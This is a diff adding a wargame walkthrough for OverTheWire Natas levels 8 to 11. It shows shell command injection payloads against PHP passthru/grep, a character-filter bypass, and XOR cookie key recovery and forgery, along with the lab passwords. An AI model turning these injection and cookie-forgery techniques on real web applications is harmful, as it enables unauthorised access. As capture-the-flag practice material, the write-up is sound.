@@ -273,9 +273,258 @@ abs@MacBookPro ~ % curl "natas8.natas.labs.overthewire.org/" -u natas8:xcoXLmzMk
 Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
 ```
 
+
 # Level 8 -> 9:
+abs@MacBookPro ~ % curl "natas9.natas.labs.overthewire.org/" -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -s                                                     
+```
+<h1>natas9</h1>
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+
+abs@MacBookPro ~ % curl "natas9.natas.labs.overthewire.org/" -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -s -d "needle=hello & submit="                           
+```
+<h1>natas9</h1>
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+hello
+hello's
+hellos
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+index-source.html:
+```
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+```
+
+
+I would like to run something like: "grep -i . /etc/natas_webpass/natas" so...
+abs@MacBookPro ~ % curl "natas9.natas.labs.overthewire.org/" -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -s -d "needle=. /etc/natas_webpass/natas10; file  & submit="
+```
+Output:
+<pre>
+t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+dictionary.txt: Unicode text, UTF-8 text
+</pre>
+```
+
+
 # Level 9 -> 10:
+abs@MacBookPro ~ % curl "natas10.natas.labs.overthewire.org/" -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu -s                                                 
+```
+For security reasons, we now filter on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+index-source.html:
+```
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+</pre>
+```
+
+lol this should be easy, I guess they want me to use cat or something the prev level..
+
+abs@MacBookPro ~ % curl "natas10.natas.labs.overthewire.org/" -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu -s -d "needle=. /etc/natas_webpass/natas11 --exclude  & submit="
+```
+Output:
+<pre>
+UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+</pre>
+```
+
+
 # Level 10 -> 11:
+abs@MacBookPro ~ % curl "natas11.natas.labs.overthewire.org/" -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -s                                                       
+```
+<h1>natas11</h1>
+<div id="content">
+<body style="background: #ffffff;">
+Cookies are protected with XOR encryption<br/><br/>
+
+
+<form>
+Background color: <input name=bgcolor value="#ffffff">
+<input type=submit value="Set color">
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+index-source.html:
+```
+$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+
+function xor_encrypt($in) {
+    $key = '<censored>';
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $key[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+function loadData($def) {
+    global $_COOKIE;
+    $mydata = $def;
+    if(array_key_exists("data", $_COOKIE)) {
+    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
+    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
+        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
+        $mydata['showpassword'] = $tempdata['showpassword'];
+        $mydata['bgcolor'] = $tempdata['bgcolor'];
+        }
+    }
+    }
+    return $mydata;
+}
+
+function saveData($d) {
+    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
+}
+
+$data = loadData($defaultdata);
+
+if(array_key_exists("bgcolor",$_REQUEST)) {
+    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
+        $data['bgcolor'] = $_REQUEST['bgcolor'];
+    }
+}
+
+saveData($data);
+?>
+
+<h1>natas11</h1>
+<div id="content">
+<body style="background: <?=$data['bgcolor']?>;">
+Cookies are protected with XOR encryption<br/><br/>
+
+<?
+if($data["showpassword"] == "yes") {
+    print "The password for natas12 is <censored><br>";
+}
+?>
+
+<form>
+Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
+<input type=submit value="Set color">
+</form>
+```
+
+abs@MacBookPro ~ % curl "natas11.natas.labs.overthewire.org/" -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -i  | grep Cookie
+```
+Set-Cookie: data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJV3djTRg%3D
+Cookies are protected with XOR encryption<br/><br/>
+```
+
+
+abs@MacBookPro ~ % echo 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D' | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))"
+```            
+HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=
+```
+
+array ^ key = data
+key = array ^ data 
+
+
+abs@MacBookPro ~ % echo 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D' | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))" | base64 -d > data
+abs@MacBookPro ~ % python3 -c 'import json; print(json.dumps({"showpassword":"no","bgcolor":"#ffffff"}))' > array                                                                
+abs@MacBookPro ~ % python3 - <<'EOF'
+a = open("data","rb").read()
+b = open("array","rb").read()
+
+print(bytes([x ^ b[i % len(b)] for i, x in enumerate(a)]))
+EOF
+```
+b'eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
+```
+
+So the key is "eDWo".
+Thus, the new cookie value should be: "eDWo" ^ {"showpassword":"yes","bgcolor":"#ffffff"}
+abs@MacBookPro ~ % python3 - <<'EOF'
+a = '{"showpassword":"yes","bgcolor":"#ffffff"}'.encode()  # default UTF-8
+b = "eDWo".encode()  # default UTF-8
+
+res = bytes([x ^ b[i % len(b)] for i, x in enumerate(a)])
+import base64
+
+print(base64.b64encode(res).decode())
+EOF
+```
+HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
+```
+
+abs@MacBookPro ~ % curl "natas11.natas.labs.overthewire.org/" -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -i -H "Cookie: data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5" 
+```
+<h1>natas11</h1>
+<div id="content">
+<body style="background: #ffffff;">
+Cookies are protected with XOR encryption<br/><br/>
+
+The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB<br>
+```
+
 # Level 11 -> 12:
 # Level 12 -> 13:
 # Level 13 -> 14:
